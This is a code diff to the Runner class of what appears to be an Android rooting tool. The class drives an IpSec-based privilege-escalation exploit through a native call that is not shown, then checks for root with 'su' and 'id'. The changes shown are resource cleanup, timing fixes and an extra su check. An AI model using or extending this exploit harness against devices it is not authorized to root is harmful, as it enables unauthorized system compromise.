@@ -4,6 +4,7 @@ import android.content.Context;
 import android.net.IpSecAlgorithm;
 import android.net.IpSecManager;
 import android.net.IpSecTransform;
+import android.os.SystemClock;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -67,6 +68,7 @@ final class Runner {
     }
 
     static int run(Context ctx, IReporter reporter, boolean softReboot) throws Exception {
+        Stats.exploitRun();
         TargetGuard.Result target = TargetGuard.check(ctx);
         if (!target.ok) {
             reporter.report("target refused: " + target.detail + "\n");
@@ -75,6 +77,8 @@ final class Runner {
         IpSecManager.UdpEncapsulationSocket encapSock = null;
         IpSecManager.SecurityParameterIndex spiObj = null;
         IpSecTransform transform = null;
+        DatagramSocket senderSock = null;
+        android.os.ParcelFileDescriptor senderFd = null;
         try {
             reporter.report("=== setup ===\n");
             IpSecManager ipsec = (IpSecManager) ctx.getSystemService(Context.IPSEC_SERVICE);
@@ -100,9 +104,8 @@ final class Runner {
             IpSecAlgorithm enc = new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey);
             IpSecAlgorithm auth = new IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128);
 
-            DatagramSocket senderSock = new DatagramSocket();
+            senderSock = new DatagramSocket();
             int senderPort = senderSock.getLocalPort();
-            android.os.ParcelFileDescriptor senderFd = null;
 
             transform = new IpSecTransform.Builder(ctx)
                     .setEncryption(enc)
@@ -128,13 +131,17 @@ final class Runner {
                     aesKey, hmacKey, ICV_LEN, senderFd.getFd(),
                     ksud.getAbsolutePath(), softReboot);
             closeQuietly(senderFd);
+            senderFd = null;
             closeQuietly(senderSock);
+            senderSock = null;
 
             if (rc == 0) {
                 applyOverlay(ctx, reporter, 120000L);
             }
             return rc;
         } finally {
+            closeQuietly(senderFd);
+            closeQuietly(senderSock);
             closeQuietly(transform);
             closeQuietly(spiObj);
             closeQuietly(encapSock);
@@ -142,7 +149,7 @@ final class Runner {
     }
 
     static void applyOverlay(Context ctx, IReporter reporter, long maxWaitMillis) {
-        long claimDeadline = System.currentTimeMillis() + OVERLAY_CLAIM_TIMEOUT_MS;
+        long claimDeadline = SystemClock.elapsedRealtime() + OVERLAY_CLAIM_TIMEOUT_MS;
         while (true) {
             if (OVERLAY_RUNNING.compareAndSet(false, true)) {
                 try {
@@ -151,7 +158,7 @@ final class Runner {
                 } finally {
                     OVERLAY_RUNNING.set(false);
                 }
-            } else if (System.currentTimeMillis() > claimDeadline) {
+            } else if (SystemClock.elapsedRealtime() > claimDeadline) {
                 reporter.report("[overlay] another application never finished; skipped\n");
                 return;
             } else {
@@ -170,13 +177,13 @@ final class Runner {
                 + " su--mount-master=" + firstLine(runAndRead(OVERLAY_SU_TIMEOUT_MS, "su", "--mount-master", "-c", "readlink /proc/self/ns/mnt"))
                 + "\n");
 
-        long deadline = System.currentTimeMillis() + maxWaitMillis;
+        long deadline = SystemClock.elapsedRealtime() + maxWaitMillis;
         int attempts = 0;
         boolean usable = false;
         while (!usable) {
             attempts++;
             usable = suUsable();
-            if (!usable && System.currentTimeMillis() < deadline) {
+            if (!usable && SystemClock.elapsedRealtime() < deadline) {
                 try {
                     Thread.sleep(OVERLAY_POLL_MS);
                 } catch (InterruptedException e) {
@@ -428,21 +435,29 @@ final class Runner {
         Process process = null;
         try {
             process = new ProcessBuilder(argv).redirectErrorStream(true).start();
+            final StringBuilder out = new StringBuilder();
+            final Process running = process;
+            Thread reader = new Thread(() -> {
+                try (BufferedReader input = new BufferedReader(
+                        new InputStreamReader(running.getInputStream()))) {
+                    String line;
+                    while ((line = input.readLine()) != null && out.length() < 16384) {
+                        out.append(line).append('\n');
+                    }
+                } catch (Throwable ignored) {
+                }
+            }, "dfroot-read");
+            reader.setDaemon(true);
+            reader.start();
+
             if (!process.waitFor(timeoutSeconds, TimeUnit.SECONDS)) {
                 process.destroyForcibly();
+                process.waitFor(2, TimeUnit.SECONDS);
+                reader.join(1000);
                 return null;
             }
-            StringBuilder out = new StringBuilder();
-            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-            try {
-                String line;
-                while ((line = reader.readLine()) != null && out.length() < 16384) {
-                    out.append(line).append('\n');
-                }
-            } finally {
-                reader.close();
-            }
-            return out.toString();
+            reader.join(1000);
+            return reader.isAlive() ? null : out.toString();
         } catch (Throwable t) {
             return null;
         } finally {
@@ -454,6 +469,10 @@ final class Runner {
 
     private static boolean suUsable() {
         String out = runAndRead(OVERLAY_SU_TIMEOUT_MS, "su", "--mount-master", "-c", "id");
+        if (out != null && out.contains("uid=0")) {
+            return true;
+        }
+        out = runAndRead(OVERLAY_SU_TIMEOUT_MS, "su", "-c", "id");
         return out != null && out.contains("uid=0");
     }
 
